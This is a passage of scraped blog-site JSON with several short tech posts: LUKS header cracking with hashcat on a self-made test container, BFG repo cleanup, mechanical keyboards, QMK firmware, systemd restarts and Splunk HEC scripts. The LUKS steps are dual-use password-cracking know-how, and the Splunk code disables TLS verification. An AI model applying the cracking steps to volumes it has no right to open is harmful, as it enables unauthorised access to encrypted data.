/dev/mapper/tmp # is random data at this point $ mkfs.ext4 /dev/mapper/tmp # use the same file system that is used by your system/device $ xxd -l 512 /dev/mapper/tmp # should no longer be random data $ cryptsetup luksClose tmp After it is created if we wanted to crack it with hashcat then we would just need to grab some header data and run it though\n$ dd if=test of=luks-header bs=512 count=4097 # grabs header $ echo \u0026#34;password\u0026#34; \u0026gt;\u0026gt;list $ hashcat -m 14600 -a 0 -w 3 luks-header list -o found We also created a cheap password list in which we knew the password anyway but this is not an exercise with hashcat lists so much as it is breaking luks.\nGreat we broke it now lets open in\n$ cryptsetup luksOpen test tmp # asks for password $ # time to mount $ mount /dev/mapper/tmp /mnt/files $ # when done unmount and close $ umount /mnt/files $ cryptsetup luksClose tmp ","permalink":"https://ridingintraffic.github.io/posts/2018-11-14-luks-hashcat/","summary":"luks encryption lets create an encrypted container and toss some data in it\u0026hellip;\n$ dd if=/dev/urandom of=test bs=1M count=100 $ cryptsetup luksFormat test #use password password $ cryptsetup luksOpen test tmp $ xxd -l 512 /dev/mapper/tmp # is random data at this point $ mkfs.ext4 /dev/mapper/tmp # use the same file system that is used by your system/device $ xxd -l 512 /dev/mapper/tmp # should no longer be random data $ cryptsetup luksClose tmp After it is created if we wanted to crack it with hashcat then we would just need to grab some header data and run it though","title":"hashcat cracking luks"},{"content":"Git got big files or keys? Break out BFG Everybody messes up, today\u0026rsquo;s mistake was adding a big file to git before a .gitignore was in place to handle it. As a result, github is rejecting the push, even after \u0026ldquo;removing\u0026rdquo; the file from git. The reason is that the file still exists in git(history). Time to clean up the mess, break out BFG and nuke it from orbit. -Sadly this means java is involved, but necessary demons. BFG can be found below, and a java jdk needs to get installed. BFG Repo-Cleaner by rtyley A simpler, faster alternative to git-filter-branch for deleting big files and removing passwords from Git history. bfg-repo-cleaner Look at BFG repo-cleaner. Welcome back, hopefully there was some reading involved. BFG repo-cleaner will be used to clean up the big files, this can also be used to clean up sensitive data that someone accidentally added to a repo. \u0026ldquo;cough cough\u0026rdquo; aws keys. It does this by rewriting the git history and removing all traces of the file. Like many things git sometimes is better not to explain the wizardry and dive right in. TLDR oh my git… just do this… black magic ensues. # prework assuming macos # visit for latest version https://rtyley.github.io/bfg-repo-cleaner/ # creates some folders, downloads bfg symlinks it and paths the file to your bash profile mkdir -p /Users/$(whoami)/.local/bin/ curl -o /Users/$(whoami)/.local/bin/bfg-1.13.0.jar http://repo1.maven.org/maven2/com/madgag/bfg/1.13.0/bfg-1.13.0.jar chmod +x /Users/$(whoami)/.local/bin/bfg-1.13.0.jar ln -s /Users/$(whoami)/.local/bin/bfg-1.13.0.jar /Users/$(whoami)/.local/bin/bfg echo $PATH:/Users/$(whoami)/.local/bin/ \u0026gt;\u0026gt; /Users/$(whoami)/.bash_profile source /Users/$(whoami)/.bash_profile #commands git clone http://github.com/bigfiles.git cd big_files git gc cd ../ java -jar bfg --delete-files \u0026lt;myhugefilename\u0026gt; big_files cd big_files git reflog expire --expire=now --all git gc --prune=now --aggressive # repo is ready to push Welcome back from blindly running commands found on the internet, everything worked correctly right? Time to break down what just happened. The prework is setting up BFG and getting it loaded into the environment. A folder structure is created in the home folder to store the jar. The jar is then downloaded and a symlink is created so that when the new version is added the old symlink can get deleted and reset. This is not entirely needed but it certainly helps. Next the folder is added to the path env variable in the bash_profile file. Then sourcing the bash_profile to use the new path and the new folder. It is not required to do all of this but, let\u0026rsquo;s be honest, this is going to happen more than once and it is better to have this in there for the future. After that the repo is cloned ( most likely it already exists so don\u0026rsquo;t worry. Then git garbage collection is run. Next move out of the directory because BFG needs to be run not in the current dir. Fire the BFG passing in the file or wildcard that should be nuked. Drop back in the folder. Expire the get reference log which cleans up some things BFG did Finally git garbage collection to clean up the rest of the cruft. That\u0026rsquo;s that, files have been removed and all history of them existing has been wiped. This type of process can be especially useful when combined with a git hook and a regex for specific things in files, like keys and whatnot. It can also easily be tied into a Jenkins build pipeline to protect people from themselves. Good luck and when in doubt break out the Big \u0026ldquo;Friggin\u0026rdquo; Gun\nBONUS: there is a fantastic zine from julia evans that talks about some other great git things New zine: Oh shit, git! new-zine\u0026ndash;oh-shit\u0026ndash;git-\n(Links for everything mentioned:) Removing sensitive data from a repository - User Documentation\nremoving-sensitive-data-from-a-repository\nBFG Repo-Cleaner by rtyley bfg-repo-cleaner\nGit - git-reflog Documentation git-reflog\nGit - git-gc Documentation git-gc\n","permalink":"https://ridingintraffic.github.io/posts/2018-11-13-git-got-big-files-bfg/","summary":"Git got big files or keys? Break out BFG Everybody messes up, today\u0026rsquo;s mistake was adding a big file to git before a .gitignore was in place to handle it. As a result, github is rejecting the push, even after \u0026ldquo;removing\u0026rdquo; the file from git. The reason is that the file still exists in git(history). Time to clean up the mess, break out BFG and nuke it from orbit. -Sadly this means java is involved, but necessary demons.","title":"git bfg cleaner"},{"content":"Mechanical and custom keyboards What was “old” is new again, Mechanical keyboards! A mechanical keyboard is one that has a discrete mechanical switch under each and every key. There are a number of sites out there that can go into the specific details about exactly how these function, as well as all the differences between the switches. This article is not going into much detail about the switches themselves but rather everything else. Lifehacker wrote a good extensive article on switches years ago. how-to-choose-the-best-mechanical-keyboard\nWhy bother with a mechanical keyboard? When someone is spending at least 8 hours a day 5 days a week, using a keyboard, a keyboard that just “feels better” can drastically improve the enjoyment from even mundane tasks. This is the world of the IT professional, and they, IT professionals in general, enjoy going deep down the rabbit hole of this subculture/niche. The first stage of the rabbit hole is the simple mechanical keyboard. These can all be found on amazon and seen all over the internet. They are the basic keyboards, sometimes have led lightning, and most times with a manufacturer’s specific mechanical switch in them. The second level of keyboards is where the switches specifically are called out. This is the gateron or the cherrymx switches, these keyboards might look a bit more subtle but they are usually a full sized keyboard or a ten keyless layout. Known in this article from massdrop, as the tenkey (tk) or tenkeyless(tkl) keyboard-layouts-explained-in-detail-many-pics Such keyboards may also have at the 60 percent layout which is the tenkeyless but minus the function keys, arrow keys and home/end/page up down keys. Finally the third level are the fully custom boards. These are the ergodox, the ortholinear, the 40 percent and the full custom builds. That was a whole bunch of information to throw out, here is some more detail on all of it.\nOrtholinear: olkb ergodox ergodox-ez\n40percent van keyboards\nStarting at level 1; Full sized and ten keyless keyboards. There are the entry level keyboards. Sometimes people will start off here and end here, or even go back because these are pretty common and comfortable. They will look like every other keyboard out there and depending on the switches that were chosen they might not feel all that different. Which leaves people asking “what’s the big deal?” A perfect example of such a keyboard is the cmstorm line which is readily available form amazon. First the tenkeyless and then the full sized quickfire full sized . tkl these keyboards will run from $40 to $80 and be the exact same thing that most people have seen. They will plug in and do exactly what every other keyboard out there does. (Yawn)\nDelving deeper into level 2; Some of the full size and the ten keyless may have the specific switches mentioned such as cherrymx or the clones known as gateron. But the second level is the more unique keyboards such at the 60 percent layouts. These are where the keyboards begin to get interesting . The classic 60 percent is known as the vortex pok3r. pok3r . These boards start around $120 This layout comes with a bit of a learning curve because the arrow keys are missing. The board comes with a default layering system that allows layers to be chosen to shift one key into a different key, therefore the arrow cluster is moved to IJKL. The nice thing about this keyboard is it allows the user to reprogram where the keys are mapped. This is done on the keyboard itself going through a series of key presses to shift modes and then move a key to a different location. While it is a nice feature hitting all the correct keys in the correct sequence with the correct timing, it can be a pain. However at the end of the day those arrows can be remapped to something like VIM arrows HJKL pretty easily. Once this customization is experienced and toyed with the itch begins to get bigger, and it is the gateway drug to the real custom keyboards.\nHere we find level 3; Fully customized and custom built keyboards. These are not the everyday keyboards, these are known as ergodox $300 ergodox-ez , Planck $150 olkb, minivan $200 van keyboards, and full customs like the 1up60HSE $100–250 1up-rgb-pcb-hse\nThese are often sold as kits and then soldered and assembled using a variety of switch types, case materials and custom keycaps. It is the individual pieces that really start to make these keyboards unique. Keyboard base materials like aluminum, al60case-champagne or hardwoods like purple heart retro60-keyboard-case-purple-heart . The designs and layouts will also catch the eye of a coworker and ask “what the heck” especially when one encounters the ergodox for the first time. This keyboard in particular with its full split layout and shifted ortholinear layout, will cause some people to simply not be able to use the keyboard when first encountered. Most of these keyboards will take many hours to assemble and will require soldering skills. However the 1upkeyboards 60HSE (hot swap edition) is a new entry into the custom keyboards. This is a new generation of PCB that allow the for swapping of switches using a sip socket of sorts. This allows the switches to be pushed in and pulled out without the need to solder and unsolder each one. The effort of soldering them in can be daunting and oftentimes there is a minor short somewhere in the board which then requires the debugging of each switch to find the flaw. The hot swap, style eliminates this problem and lowers the bar to entry drastically.\nLooks aside, under the hood is really where these keyboards begin to shine. All of the aforementioned keyboards have the ability to run a custom firmware known as QMK qmk_firmware QMK is an open source project that supports well over 120 keyboards. It is written in C and can be compiled from a docker image. The docker image is highly recommended because there are a number of toolkit and package dependancies that are instantly resolved when built with docker. QMK itself allows for the complete programming of every aspect of the keyboard. Dvorak layout? No problem. Colemak?, not an issue. The ergodox can even be transformed into a Stenograph layout. Stenographs can easily cost over $1000, therefore the $300 price tag is a steal. QMK’s killer feature is its ability to program in a variety of macros into the hardware itself. Where a series of keystrokes in order to bring up the correct layer and key, can trigger a function written in C to fire which will output anything the user can imagine. Personal favorites include sending unicode symbols for ಠ_ಠ` ¯_(ツ)_/¯ (╯°□°)╯ ︵ ┻━┻ These can also be used to program in entire code blocks for people that are rewriting the same comment headers or other tedious things in developer land. Implementing the custom programming is also much easier than having to go through the series of button sequences. The process entails compiling the firmware to a hex file and then pressing a reset button on the keyboard and flashing the hex file to the keyboard. No muss no fuss. The possibilities are truly endless.\nThat was a brief run through of the niche world of the mechanical keyboard. People who spend much of their time in front of screens and on these keyboards tend to have an affinity for how they feel and how they are setup. Sure it is easy to use a basic keyboard, but what is the fun in that when the hacker street cred can go through the roof when someone stops by your desk and literally has no idea how to use the text entry device sitting in front of them. For further information and a community of these folks head over to r/mechanicalkeyboards and spend hours looking through everything there is to offer. It is a deep rabbit hole with almost no end to be found. Good luck.\n","permalink":"https://ridingintraffic.github.io/posts/2018-11-13-mechanical_and_custom_keyboards/","summary":"Mechanical and custom keyboards What was “old” is new again, Mechanical keyboards! A mechanical keyboard is one that has a discrete mechanical switch under each and every key. There are a number of sites out there that can go into the specific details about exactly how these function, as well as all the differences between the switches. This article is not going into much detail about the switches themselves but rather everything else.","title":"Mechanical and custom keyboards"},{"content":"QMK deepdive using a sweeet16 16 keys!? What can be done with 16 keys for a keyboard? Using an amazing open source firmware and a kit by 1upkeyboards, much can be done with only 16 keys. QMK is a powerhouse of a firmware that allows an endless combination of regular keys, functions and extended macros. These features are relatively easy to construct and the firmware itself can be very easy to build and flash.\nFirst things first what is a sweet16? It is a macropad sold as a kit, made by 1upkeyboards. This macropad requires assembly, which includes soldering in the diodes, arduino and switches. All and all the assembly should take from 20min to an hour depending on skillset and haste. Sweet 16 Macro Pad - 1Up Keyboards\nan assembly video can be found here: youtu.be/Bw-BvKnZqBg (embedding youtube doesn\u0026rsquo;t work in medium) Truncated assembly photos are included here \u0026lt;\u0026ndash; The video is the best source of a step by step walkthrough assembling the pad. The goal of the article today is not to walk through the hardware assembly but more about the software.\nThe macropad has now been assembled and there is a supplied basic firmware that will give the functionality of a simple numpad. The hex file is here: sweet16.hex QMK has a great flashing program called QMK toolbox, it is available for mac and pc and can be downloaded here. qmk.fm/toolbox/ It is as easy as downloading the toolbox running the application and then plugging in the sweet16 macropad. First open the qmk toolbox app and load the hex file that was downloaded above. Then plug in the pad and there is a reset switch on the back, press that and the toolbox registers a new device, then just click flash, wait a few seconds and wait for “done”.\nafter hitting reset\nthe flash is complete The point of the simple hex firmware is to ensure that all of the switches are working properly and the assembly was successful. It can be a bit tricky to make sure all the solder points are good. Therefore, a simple keypad debug is the easiest way to confirm assembly.\nThe hardware is assembled correctly and everything works. Now on to the fun part. Building the custom firmware. The qmk docs are great for explaining everything about the firmware and the source code is, open source. Links to the firmware and docs are below. It is highly suggested, reading through all of these.\nqmk/qmk_firmware\nkeyboard controller firmware for Atmel AVR and ARM USB families - qmk/qmk_firmware github.com QMK Firmware\nDescription docs.qmk.fm Great, welcome back. The three main files that are modified when working with qmk firmware are all found in the folder of the specific keyboard. in this cases its keyboards/1upkeyboards/sweet16 The important files are config.h keymap.c rules.mk The config.h is where global variables are setup. The rules.mk is where functionally is enabled or disabled, such as turn on RGB underglow or “tap dance”. Finally the keymap.c is where the magic happens, this is the file that defines what the keys do and has the custom functions.\nThe firmware that is referenced can be found as a part of the master branch for QMK (medium doesn\u0026rsquo;t want to embed) yey! author, open source contribution ftw sweet16/keymaps/ridingintraffic/keymap.c\n... const uint16_t PROGMEM keymaps[][MATRIX_ROWS][MATRIX_COLS] = { /* EMOJI Pad * ,-------------------------------. * |TFLIP | TFlIP2|DISFACE| FU | * |------+-------+-------+--------| * | CLOUD| | | CLEAR | * |------+-------+-------+--------| * |SHRUG |DISFACE| HRTFAC| HAPPYF | * |------+-------+-------+--------| * | ENTER| |LEDCNTR| tapland| * `-------------------------------\u0026#39; */ //purple [_EMOJI] = LAYOUT_ortho_4x4( TFLIP, TFLIP2, KC_NO, FU , CLOUD, KC_NO, KC_NO, CMDCLEAR, SHRUG, DISFACE, HEARTFACE, HAPPYFACE, KC_ENT, RGB_TOG, MO(_LEDCNTL), MO(_TAPLAND) ), This first snippet is an example of the basic key layout. In the real firmware the variables initialization for all the custom keys is done at the top, but here is where the grid of keys are assigned and the “odd” names of tflip and disface are used, wat? This is the fun part, these odd keynames are actually functions that invoke sending hexcode combinations through the keyboard for that single key press which will print an inline ascii art reaction emoji.\ntflip: (╯°□°)╯ ︵ ┻━┻ tflip2: ┻━┻︵ \\(°□°)/ ︵ ┻━┻ fu: t(-_-t) cloud: (っ◕‿◕)っ shrug: ¯\\_(ツ)_/¯ disface: ಠ_ಠ heartface: ♥‿♥ happyface: ʘ‿ʘ These custom keycodes when pressed, trigger a function that passes the hexcodes. This is done simply below\nbool process_record_user(uint16_t keycode, keyrecord_t *record) { if (record-\u0026gt;event.pressed) { switch(keycode) { case CLOUD: // (っ◕‿◕)っ if(record-\u0026gt;event.pressed){ send_unicode_hex_string(\u0026#34;0028 3063 25D5 203F 25D5 0029 3063\u0026#34;); } return false; break; case FU: // t(-_-t) if(record-\u0026gt;event.pressed){ SEND_STRING(\u0026#34;t(-_-t)\u0026#34;); } return false; break; case HAPPYFACE: // ʘ‿ʘ if(record-\u0026gt;event.pressed){ send_unicode_hex_string(\u0026#34;0298 203F 0298\u0026#34;); } return false; break; case CMDCLEAR: if (record-\u0026gt;event.pressed) { register_code(KC_LGUI); tap_code(KC_A); unregister_code(KC_LGUI); tap_code(KC_DEL); } return false; break; case SHRUG: // ¯\\_(ツ)_/¯ if (record-\u0026gt;event.pressed) { send_unicode_hex_string(\u0026#34;00AF 005C 005F 0028 30C4 0029 005F 002F 00AF\u0026#34;); } return false; break; case HEARTFACE: // ♥‿♥ if(record-\u0026gt;event.pressed){ send_unicode_hex_string(\u0026#34;2665 203F 2665\u0026#34;); } return false; break; case DISFACE: // ಠ_ಠ if(record-\u0026gt;event.pressed){ send_unicode_hex_string(\u0026#34;0CA0 005F 0CA0\u0026#34;); } return false; break; case TFLIP: // (╯°□°)╯ ︵ ┻━┻ if(record-\u0026gt;event.pressed){ send_unicode_hex_string(\u0026#34;0028 256F 00B0 25A1 00B0 0029 256F 0020 FE35 0020 253B 2501 253B\u0026#34;); } return false; break; case TFLIP2: // ┻━┻︵ \\(°□°)/ ︵ ┻━┻ if(record-\u0026gt;event.pressed){ send_unicode_hex_string(\u0026#34;253B 2501 253B FE35 0020 005C 0028 00B0 25A1 00B0 0029 002F 0020 FE35 0020 253B 2501 253B\u0026#34;); } return false; break; } } return true; } Simple enough, now the macropad has simple functionality and has been filled up with reaction emojis. Some would find that useful others may see it as a waste. That is where the concept of layering comes in. Documentation of course is available explaining exactly how layering works switching-and-toggling-layers Think of layers like switching from upper case to lower case, or the symbols that are in the number row. There is the ability to toggle between layers much like capslock, however it can be easier to just have a shift key style layering called “momentary” or “mo” layering, where the layer is only active while a key is held. Either way that now enables a whole new set of functions to be added to the keys while only sacrificing a single key to switch between the layers.\nOnto the final chapter, “tap dance”. This is where things get a little weird. With normal keyboards and normal experiences a single keypress enters a single key, and a quicker double keypress enters two of those keys. With qmk and tapdance this all changes because when enabled and coded, the tap dance functionality will say “when pressed once” output a , when “pressed twice in 500ms” output super happy fun guy . The example is below\nkeymap.c .... /* tap dance time */ void tdexample1(qk_tap_dance_state_t *state, void *user_data) { if (state-\u0026gt;count \u0026gt;= 2) { SEND_STRING(EXAMPLESTRING1); reset_tap_dance (state); } } void tdexample2(qk_tap_dance_state_t *state, void *user_data) { if (state-\u0026gt;count \u0026gt;= 2) { SEND_STRING(EXAMPLESTRING2); reset_tap_dance (state); } } void tdexample3(qk_tap_dance_state_t *state, void *user_data) { if (state-\u0026gt;count \u0026gt;= 2) { SEND_STRING(EXAMPLESTRING3); reset_tap_dance (state); } } void tdexample4(qk_tap_dance_state_t *state, void *user_data) { if (state-\u0026gt;count \u0026gt;= 2) { SEND_STRING(EXAMPLESTRING4); reset_tap_dance (state); } } qk_tap_dance_action_t tap_dance_actions[] = { [TD_EXAMPLE1] = ACTION_TAP_DANCE_FN(tdexample1), [TD_EXAMPLE2] = ACTION_TAP_DANCE_FN(tdexample2), [TD_EXAMPLE3] = ACTION_TAP_DANCE_FN(tdexample3), [TD_EXAMPLE4] = ACTION_TAP_DANCE_FN(tdexample4) }; ... config.h ... #define EXAMPLESTRING1 \u0026#34;tapdance_1\u0026#34; #define EXAMPLESTRING2 \u0026#34;tapdance_2\u0026#34; #define EXAMPLESTRING3 \u0026#34;tapdance_3\u0026#34; #define EXAMPLESTRING4 \u0026#34;tapdance_4\u0026#34; Here the keycode TD_EXAMPLE1 is bound to the tapdance function tdexample1 and then that function sends the string that was defined in config.h that outputs tapdance_1 . It sounds a little complicated but break it down and then its simple, tap the key once get an emjoi, double tap the key get a whole string. Add in a layer shift and then there is an entire new functionality behind the key. And it is done The sweet16 macropad is now massively more useful than just a single numpad with 16 buttons. The macropad has enough memory to do at least 4+ layers like this. At which point it is pretty tough to keep all the functions memorized.\nBut thats not all. QMK comes equipped with a Dockerfile. Which means building the firmware is as simple as having docker installed and then running the build process from docker. An example command would be:\ndocker run -e keymap=ridingintraffic -e keyboard=1upkeyboards/sweet16 — rm -v $(\u0026#39;pwd\u0026#39;):/qmk:rw edasque/qmk_firmware Through the power of docker it is volume mounting the working directory with all of the keyboard keymaps, into the image and then all of the build dependancies are prebuilt in the image and the Ccode is then converted into a hex file in the root folder of QMK. No muss no fuss just a clean build environment and the compiled hex files for the keyboard. Anyone that has tried to compile firmware before, knows that this is a massive time savings and the reproducibility is incredible.\nThats it! A macropad and an entire open source firmware that supports over 120 keyboards. QMK and the open source community behind it are wonderful. There is a discord chat as well if chatting to a human is helpful when stuck, or let me know and I can help out wherever I can.\n","permalink":"https://ridingintraffic.github.io/posts/2018-11-13-qmk_deepdive_sweet16/","summary":"QMK deepdive using a sweeet16 16 keys!? What can be done with 16 keys for a keyboard? Using an amazing open source firmware and a kit by 1upkeyboards, much can be done with only 16 keys. QMK is a powerhouse of a firmware that allows an endless combination of regular keys, functions and extended macros. These features are relatively easy to construct and the firmware itself can be very easy to build and flash.","title":"QMK deepdive with 1up sweeet16"},{"content":"docker powershell To prove a point i went out and foudn that there is a microsoft supported docker image for powershell. dockerhub - microsoft\nthis means that running a mac, you can run docker that runs linux and then will let you run powershell.. You must go deeper\u0026hellip; ha\ninstant pot dragon head instant pots are pretty rad and there is this little thingverse that will let you have a dragon head for your instant pot, you just need to make sure that you print it with pla so that it does not instamelt when you are releasing the steam dragon head\n","permalink":"https://ridingintraffic.github.io/posts/2018-11-12-docker_powershell/","summary":"docker powershell To prove a point i went out and foudn that there is a microsoft supported docker image for powershell. dockerhub - microsoft\nthis means that running a mac, you can run docker that runs linux and then will let you run powershell.. You must go deeper\u0026hellip; ha\ninstant pot dragon head instant pots are pretty rad and there is this little thingverse that will let you have a dragon head for your instant pot, you just need to make sure that you print it with pla so that it does not instamelt when you are releasing the steam dragon head","title":"docker-powershell"},{"content":"Systemd restarting A while ago I had a service that would need to be restarted after it had a cool down of about 2 hours\u0026hellip; I had a stanza that stated\nRestart=always RestartSec=7200 which was cool because it would just autorestart when it died. At the time the restart would work just fine after the cooldown. The catch that I ran in to was because of that timer, if I logged in and tried to start it when it was in a failed state, the service would hang. The fix for this is to issue the systemctl stop service command and the run the systemctl start service It was super annoying figuring this out so a good idea to keep track of it for later ;)\n[Unit] Description=your desc Wants=network-online.target After=network-online.target AssertFileIsExecutable=/opt/something.py [Service] WorkingDirectory=/opt User=root Group=root PermissionsStartOnly=true EnvironmentFile=-/etc/default/ ExecStartPre= ExecStart=/bin/python /opt/something.py # Let systemd restart this service only if it has ended with the clean exit code or signal. # Restart=on-success Restart=always RestartSec=7200 # ^^ 2 hours so the drive has time to recover StandardOutput=journal StandardError=inherit splunk hec python before i had a splunk hec python bit that would do things to publish info into splunk from python. This kind of worked but it had a weird bug in it\u0026hellip; that bug is fixed here.\n#!/usr/bin/env python import time import requests import urllib3 ##turns off the warning that is generated below because using self signed ssl cert urllib3.disable_warnings() authToken=\u0026#34;my token\u0026#34; splunkhost=\u0026#34;localhost\u0026#34; def splunkHec(host, token, logdata): url=\u0026#39;https://\u0026#39;+host+\u0026#39;:8088/services/collector/event\u0026#39; authHeader = {\u0026#39;Authorization\u0026#39;: \u0026#39;Splunk \u0026#39;+token} r = requests.post(url, headers=authHeader, json=logdata, verify=False) def main(): while True: payload = {} payload.update({\u0026#34;index\u0026#34;:\u0026#34;my_index\u0026#34;}) payload.update({\u0026#34;sourcetype\u0026#34;:\u0026#34;mysourcetype\u0026#34;}) payload.update({\u0026#34;source\u0026#34;:\u0026#34;mysource\u0026#34;}) payload.update({\u0026#34;host\u0026#34;:\u0026#34;myhost\u0026#34;}) payload.update({\u0026#34;event\u0026#34;:data}) splunkHec(splunkhost, authToken, payload) if __name__ == \u0026#34;__main__\u0026#34;: main() ","permalink":"https://ridingintraffic.github.io/posts/2018-11-09-systemd-restart-fail/","summary":"Systemd restarting A while ago I had a service that would need to be restarted after it had a cool down of about 2 hours\u0026hellip; I had a stanza that stated\nRestart=always RestartSec=7200 which was cool because it would just autorestart when it died. At the time the restart would work just fine after the cooldown. The catch that I ran in to was because of that timer, if I logged in and tried to start it when it was in a failed state, the service would hang.","title":"Systemd-restarts-splunk-py"},{"content":"Outlook is terrible Yes outlook is horrible but when you have to use it, its nice to be able to set defaults that don\u0026rsquo;t annoy others. One such is the default reminder for the calendar\u0026hellip; Most of the time reminders aren\u0026rsquo;t useful unless they are used sparingly. Let turn them off. change-the-default-reminder-time\ntick stack and grafana i like the tick stack and it can be useful for a number of things, here is a brief overview of it. tick stack tick-grafana-docker\n","permalink":"https://ridingintraffic.github.io/posts/2018-11-06-outlook-reminders/","summary":"Outlook is terrible Yes outlook is horrible but when you have to use it, its nice to be able to set defaults that don\u0026rsquo;t annoy others. One such is the default reminder for the calendar\u0026hellip; Most of the time reminders aren\u0026rsquo;t useful unless they are used sparingly. Let turn them off. change-the-default-reminder-time\ntick stack and grafana i like the tick stack and it can be useful for a number of things, here is a brief overview of it.","title":"Outlook-reminders"},{"content":"Bash ctrl+r Bash has a special “recall” mode you can use to search for commands you’ve previously run:\nCtrl+R: Recall the last command matching the characters you provide. Press this shortcut and start typing to search your bash history for a command. Ctrl+O: Run a command you found with Ctrl+R. Ctrl+G: Leave history searching mode without running a command. keyboard-shortcuts-for-bash-command-shell\n","permalink":"https://ridingintraffic.github.io/posts/2018-11-05-bash-ctrl-r/","summary":"Bash ctrl+r Bash has a special “recall” mode you can use to search for commands you’ve previously run:\nCtrl+R: Recall the last command matching the characters you provide. Press this shortcut and start typing to search your bash history for a command. Ctrl+O: Run a command you found with Ctrl+R. Ctrl+G: Leave history searching mode without running a command. keyboard-shortcuts-for-bash-command-shell","title":"bash-ctrl+r"},{"content":"Systemd restart policy sometimes services die. sometimes there is not a better option because of the situatuion that you are in, and you just need to wait it out and then restart the service\u0026hellip; I know it isn\u0026rsquo;t ideal and that there should be better ways around having to do this but hey ¯_(ツ)_/¯\n[Service] Type=simple Restart=always RestartSec=3 ExecStart=/path/to/script In my case I needed to wait it out and restart the service 2 hours after it died. because the process was filling up a hdd and the only option was to let the hdd drain, because the downstream process is the bottle neck. two hours of seconds equals 7200 seconds. yey\nwatch sometimes watching a command is super useful lets watch the disk space in MB for root every 30 seconds\nwatch -n 30 free -m / friday link dump some programming langauges that are useful if you are in security, while I dont agree that php is a great language there are times that i have had to read it\u0026hellip;. 5-best-programming-languages-to-learn-for-cyber-security\nautomating things in the cloud, just some stuff for automating the-4-phases-to-automating-cloud-management\ngit prompt. I like having my terminal up to date with things because I have most of my files version controlled. personally i use bash-git-prompt but the article at least explains the usefulness of a git prompt why-linux-developers-should-use-gitprompt\n","permalink":"https://ridingintraffic.github.io/posts/2018-11-02-systemd-restarts/","summary":"Systemd restart policy sometimes services die. sometimes there is not a better option because of the situatuion that you are in, and you just need to wait it out and then restart the service\u0026hellip; I know it isn\u0026rsquo;t ideal and that there should be better ways around having to do this but hey ¯_(ツ)_/¯\n[Service] Type=simple Restart=always RestartSec=3 ExecStart=/path/to/script In my case I needed to wait it out and restart the service 2 hours after it died.","title":"systemd-restarts-friday-links"},{"content":"Splunk HTTP collector python script Hey the http collector is awesome so let use it in python to send things to stuff\u0026hellip; This is going to just take a dictionary as event data and then pass that to the http collector using only the request library . You will need to have a collector enabled for splunk and a token generated.\n#!/usr/bin/env python import time import requests import urllib3 ##turns off the warning that is generated below because using self signed ssl cert urllib3.disable_warnings() authToken=\u0026#34;some token\u0026#34; splunkhost=\u0026#34;localhost\u0026#34; def splunkHec(host, token, logdata): url=\u0026#39;https://\u0026#39;+host+\u0026#39;:8088/services/collector/event\u0026#39; authHeader = {\u0026#39;Authorization\u0026#39;: \u0026#39;Splunk \u0026#39;+token} r = requests.post(url, headers=authHeader, json=logdata, verify=False) def main(): while True: data = [\u0026#39;kitchen\u0026#39;,\u0026#39;ballroom\u0026#39;,\u0026#39;conservatory\u0026#39;,\u0026#39;dining room\u0026#39;,\u0026#39;cellar\u0026#39;,\u0026#39;billiard room\u0026#39;,\u0026#39;library\u0026#39;,\u0026#39;lounge\u0026#39;,\u0026#39;hall\u0026#39;,\u0026#39;study\u0026#39;] payload = {} payload.update({\u0026#34;index\u0026#34;:\u0026#34;default\u0026#34;}) payload.update({\u0026#34;sourcetype\u0026#34;:\u0026#34;_json\u0026#34;}) payload.update({\u0026#34;source\u0026#34;:\u0026#34;status\u0026#34;}) payload.update({\u0026#34;host\u0026#34;:\u0026#34;test\u0026#34;}) payload.update({\u0026#34;event\u0026#34;:data}) splunkHec(splunkhost, authToken, payload) time.sleep(60) if __name__ == \u0026#34;__main__\u0026#34;: main() enabling splunk http collector from curl a localhost curl command in order to turn on the http collector\ncurl -k -X \u0026#34;POST\u0026#34; -u admin:\u0026lt;password\u0026gt; https://localhost:8089/servicesNS/admin/splunk_httpinput/data/inputs/http/http/enable splunk http collector curl Most time basic terminal tools are the best tools\u0026hellip; this is an example of curl and python to get a https collector token generated and then printed out \u0026hellip; Awesome for when you dont have JQ or any other fancy terminal tools.\n$ curl -s -u admin:\u0026lt;password\u0026gt; https://localhost:8089/servicesNS/nobody/system/data/inputs/http/?output_mode=json \\ -d name=named_token \\ -d sourcetype=cnamed_sourcetype \\ -d index=default \\ --insecure -X POST | python -c \u0026#39;import json,sys;obj=json.load(sys.stdin);print obj[\u0026#34;entry\u0026#34;][0][\u0026#34;content\u0026#34;][\u0026#34;token\u0026#34;]\u0026#39; $ 4fcb9bab-8050-4cce-ab18-c76638b8b271 $ deleting http collector from curl Opps mistakes were made and we need to delete an http collector token from curl\ncurl -k -X \u0026#34;DELETE\u0026#34; -u admin:\u0026lt;password\u0026gt; https://localhost:8089/servicesNS/admin/splunk_httpinput/data/inputs/http/\u0026lt;your_token_name\u0026gt; ","permalink":"https://ridingintraffic.github.io/posts/2018-10-25-splunk-hec-python/","summary":"Splunk HTTP collector python script Hey the http collector is awesome so let use it in python to send things to stuff\u0026hellip; This is going to just take a dictionary as event data and then pass that to the http collector using only the request library . You will need to have a collector enabled for splunk and a token generated.\n#!/usr/bin/env python import time import requests import urllib3 ##turns off the warning that is generated below because using self signed ssl cert urllib3.","title":"splunk-hec-python"},{"content":"splunking home power What happens when you take Splunk, a wireless smart meter and an api interface? Splunking your entire home’s power main, without touching a single power wire! This allows a whole house view of all the power being drawn in real time. The only requirements are raspberry pi on a network, a splunk instance somewhere and a usb adapter plugged into the PI.\nHold on, hold on, whats a smart meter? Recently the major power companies have been going around and replacing the old power meters on everybody’s house with a new fancy smart meter. This is essentially just a zigbee enabled power meter than allows power vans to roll down the street and collect all the readings quickly, without having a meter reader go house to house on foot. https://www.comed.com/SmartEnergy/SmartMeterSmartGrid/Pages/ForYourHome.aspx This page or the page for the a similar provider can be useful when identifying what kind of meter is installed. Then identify the usb dongle that is compatible to the smart meter, most sites have a list of those devices. Then order it up and get it registered via power company. A simple process however it requires paperwork and some lead time. The device that will be used here is the Rainforest EMU-2 Energy Monitoring Unit. https://www.amazon.com/gp/product/B00BGDPRAI/\nEnough of the prework time to dive in. The bulk of the work will be done with a python script that reads from the usb adapter, which is recognized as a serial port on the pi. Then we will install the python script as a service on the pi, which will allow it to run on boot and be easily restarted, and monitored.\nThe python script: https://gist.githubusercontent.com/ridingintraffic/58cad97660dc2486eba8df306f2af90a/raw/b70ac05348a8f5013458650a85c44190e35de2b4/emu.py\n#!/usr/bin/env python from raven import raven from raven import _version import argparse import logging as log from splunk_hec_handler import SplunkHecHandler #splunk hec collector info token = \u0026#34;\u0026lt;your splunk token\u0026gt;\u0026#34; splunkhost=\u0026#34;\u0026lt;your splunk 